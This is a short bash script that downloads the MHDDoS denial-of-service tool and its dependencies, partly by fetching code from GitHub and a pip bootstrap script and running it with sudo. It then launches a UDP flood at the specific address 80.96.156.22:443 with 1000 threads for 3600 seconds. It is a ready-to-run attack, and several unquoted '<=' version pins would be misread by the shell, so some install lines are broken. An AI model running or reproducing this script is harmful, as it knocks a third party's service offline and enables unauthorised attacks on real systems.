#!/bin/bash
git clone https://github.com/Chen-Sa/MHDDoS.git
curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
cd MHDDoS/
sudo python3 -m pip install cfscrape<=2.1.1
sudo python3 -m pip install certifi<=2021.10.8
sudo python3 -m pip install dnspython>=2.2.0
sudo python3 -m pip install requests==2.27.1
sudo python3 -m pip install impacket==0.9.23
sudo python3 -m pip install psutil>=5.9.0
sudo python3 -m pip install icmplib>=2.1.1
sudo python3 -m pip install git+https://github.com/Chen-Sa/PyRoxy.git
sudo python3 -m pip install yarl~=1.7.2
sudo python3 start.py udp 80.96.156.22:443 1000 3600
